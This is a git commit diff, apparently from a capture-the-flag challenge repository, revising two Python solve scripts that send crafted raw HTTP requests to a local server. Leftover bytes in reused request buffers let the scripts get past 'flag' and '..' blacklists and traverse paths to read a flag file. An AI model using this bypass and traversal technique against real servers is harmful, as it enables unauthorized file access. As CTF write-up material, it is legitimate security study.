7336ec392daa64c5207c96acea75131c5d622e10
Aushaaf Fadhilah Azzah <fadhilahazzah04@gmail.com>
2023-10-03 09:18:20 +0700

    push revisions

--- neozap-checker/writeup/solve.py
+++ neozap-checker/writeup/solve.py
@@ -5,27 +5,35 @@ HOST, PORT = "127.0.0.1", 8080
 
 
 def exploit():
-    # Goal: GET /../flag.txt
+    # Goal: GET /../flag/flag.txt
     try:
         # =-=-=-= Initial Request =-=-=-=
         # from -> ''
-        # to   -> 'GET  /./xlag.txt'
+        # to   -> 'GET  /./xlag/xlag.txt'
         io = remote(HOST, PORT)
-        payload = f"GET{' ' * (0x20-3) + '/./xlag.txt?password=fib'} HTTP/1.1"
+        payload = f"GET{' ' * (0x20-3) + '/./xlag/xlag.txt?password=fib'} HTTP/1.1"
         io.send(payload.encode())
         io.close()
 
-        # =-=-=-= Bypass 'flag' blacklist =-=-=-=
-        # from -> 'GET  /./xlag.txt'
-        # to   -> 'GET  /./flag.txt'
+        # =-=-=-= Bypass 'flag' blacklist #1 =-=-=-=
+        # from -> 'GET  /./xlag/xlag.txt'
+        # to   -> 'GET  /./xlag/flag.txt'
+        io = remote(HOST, PORT)
+        payload = f"GET{' ' * (0x20-3)}/./xlag/f"
+        io.send(payload.encode())
+        io.close()
+
+        # =-=-=-= Bypass 'flag' blacklist #2 =-=-=-=
+        # from -> 'GET  /./xlag/flag.txt'
+        # to   -> 'GET  /./flag/flag.txt'
         io = remote(HOST, PORT)
         payload = f"GET{' ' * (0x20-3)}/./f"
         io.send(payload.encode())
         io.close()
 
         # =-=-=-= Bypass '..' blacklist =-=-=-=
-        # from -> 'GET  /./flag.txt'
-        # to   -> 'GET /../flag.txt'
+        # from -> 'GET  /./flag/flag.txt'
+        # to   -> 'GET /../flag/flag.txt'
         io = remote(HOST, PORT)
         payload = f"GET{' ' * (0x20-4)}/."
         io.send(payload.encode())
--- neozap-checker/writeup/solve2.py
+++ neozap-checker/writeup/solve2.py
@@ -5,19 +5,27 @@ HOST, PORT = "127.0.0.1", 8080
 
 
 def exploit():
-    # Goal: GET //home/flag.txt
+    # Goal: GET //home/flag/flag.txt
     try:
         # =-=-=-= Initial Request =-=-=-=
         # from -> ''
-        # to   -> 'GET  /home/xlag.txt'
+        # to   -> 'GET  /home/xlag/xlag.txt'
         io = remote(HOST, PORT)
-        payload = f"GET{' ' * (0x20-3)}/home/xlag.txt?password=fib HTTP/1.1"
+        payload = f"GET{' ' * (0x20-3)}/home/xlag/xlag.txt?password=fib HTTP/1.1"
         io.send(payload.encode())
         io.close()
 
-        # =-=-=-= Bypass 'flag' blacklist =-=-=-=
-        # from -> 'GET  /home/xlag'
-        # to   -> 'GET //home/flag'
+        # =-=-=-= Bypass 'flag' blacklist #1 =-=-=-=
+        # from -> 'GET  /home/xlag/xlag.txt'
+        # to   -> 'GET  /home/xlag/flag.txt'
+        io = remote(HOST, PORT)
+        payload = f"GET{' ' * (0x20-3)}/home/xlag/f"
+        io.send(payload.encode())
+        io.close()
+
+        # =-=-=-= Bypass 'flag' blacklist #2 =-=-=-=
+        # from -> 'GET  /home/xlag/flag.txt'
+        # to   -> 'GET //home/flag/flag.txt'
         io = remote(HOST, PORT)
         payload = f"GET{' ' * (0x20-4)}//home/f"
         io.send(payload.encode())
